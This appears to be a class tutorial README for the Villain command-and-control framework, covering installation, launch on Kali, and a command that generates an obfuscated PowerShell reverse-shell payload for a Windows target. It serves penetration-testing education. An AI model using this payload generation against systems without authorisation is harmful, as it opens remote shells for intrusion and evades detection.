# Villain Framework: Creating a Reverse Shell for Pentesting Windows

The Villain Framework is an open-source command-and-control (C2) framework designed for security researchers and penetration testers. It provides a platform to manage multiple agents, execute payloads, and simulate advanced adversary techniques in red team engagements. Villain supports cross-platform payloads, making it useful for testing the security posture of diverse environments. While powerful, it is intended strictly for ethical use in authorized security assessments and learning, helping professionals understand post-exploitation scenarios and improve defenses.

## Steps to get started with Villain

### 1. <ins>Installation</ins>
- Clone the repo as per the instructions in class:
  ```zsh
  https://github.com/keralahacker/Villain.git
  cd Villain
  ```
- Install the necessary dependencies:
  ```zsh
  sudo apt-get update
  sudo apt install python3-pip python3-dev build-essential libssl-dev libffi-dev
  sudo apt upgrade
  ```
- Create and activate a safe virtual environment to run `Villain.py`:
  ```zsh
  python3 -m venv venv
  source venv/bin/activate
  pip3 install -r requirements.txt
  ```
### 2. <ins>Launch</ins>
- Once in `/Villain`, launch the tool by:
  ```zsh
  sudo python3 Villain.py
  ```

<img width="1920" height="1080" alt="VirtualBox_kali-linux-2025 2-virtualbox-amd64_19_08_2025_05_19_06" src="https://github.com/user-attachments/assets/9716fb8a-73d2-4997-be7e-1c8769bf72d9" />

### 3. <ins>Generate and Execute Paylaod</ins>
- Now, generate a payload for a victim Windows machine using the following command:
  ```zsh
  generate os=windows payload=windows/reverse_tcp/powershell lhost=eth0 obfuscate
  ```
  
